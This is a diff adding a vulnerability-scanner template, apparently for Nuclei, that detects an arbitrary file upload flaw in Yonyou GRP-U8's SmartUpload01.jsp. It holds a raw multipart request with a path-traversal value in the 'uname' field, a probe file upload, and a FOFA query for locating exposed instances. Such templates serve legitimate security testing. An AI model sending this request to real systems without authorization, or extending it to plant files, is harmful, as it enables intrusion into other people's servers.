@@ -1,0 +1,43 @@
+id: yonyou-grp-u8-smartupload01-fileupload
+
+info:
+  name: 用友 GRP-U8 SmartUpload01 任意文件上传
+  author: Observer
+  severity: critical
+  description: |
+    用友 GRP-U8 /u8qx/SmartUpload01.jsp 文件上传接口。本模板按官方 afrog r0 识别接口回显 SmartUpload，保持 critical，不把上传漏洞识别降为 info。
+  reference:
+    - https://github.com/zan8in/afrog
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: title="用友GRP-U8"
+  tags: yonyou,grp-u8,fileupload
+
+http:
+  - raw:
+      - |
+        POST /u8qx/SmartUpload01.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryargusyonyou01
+
+        ------WebKitFormBoundaryargusyonyou01
+        Content-Disposition: form-data; name="uname"
+
+        ../../../../../../../../../tmp
+        ------WebKitFormBoundaryargusyonyou01
+        Content-Disposition: form-data; name="input_localfile"; filename="probe.pdf"
+        Content-Type: application/pdf
+
+        %PDF-1.4
+        ------WebKitFormBoundaryargusyonyou01--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "SmartUpload"
+      - type: status
+        status:
+          - 200
